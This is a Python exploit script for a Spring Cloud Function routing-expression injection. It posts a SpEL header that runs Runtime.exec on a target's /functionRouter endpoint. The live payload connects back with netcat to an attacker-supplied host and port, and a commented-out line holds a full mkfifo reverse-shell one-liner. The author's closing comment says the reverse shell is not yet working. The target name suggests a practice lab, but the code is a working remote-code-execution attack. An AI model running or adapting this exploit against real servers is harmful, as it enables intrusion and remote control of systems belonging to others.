import requests
import sys

if len(sys.argv) < 4:
    print(f"Usage: python3 {sys.argv[0]} http://pwnme.local 8080 LHOST LPORT")
    sys.exit(0)

url = sys.argv[1]
port = sys.argv[2]
lhost = sys.argv[3]
lport = sys.argv[4]

#payload = f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {lhost} {lport} >/tmp/f"
payload = f"nc {lhost} {lport}"

headers = {"spring.cloud.function.routing-expression": f"T(java.lang.Runtime).getRuntime().exec('{payload}')" }

data = "data"
url = f"{url}:{port}/functionRouter"

try:
    res = requests.post(url, headers=headers, data=data)
    print(res.text)
except Exception as e:
    print(f"An error occurred: {e}")
    
# I can't seem to get a working reverse shell work tho it can connect when i use normal nc :(
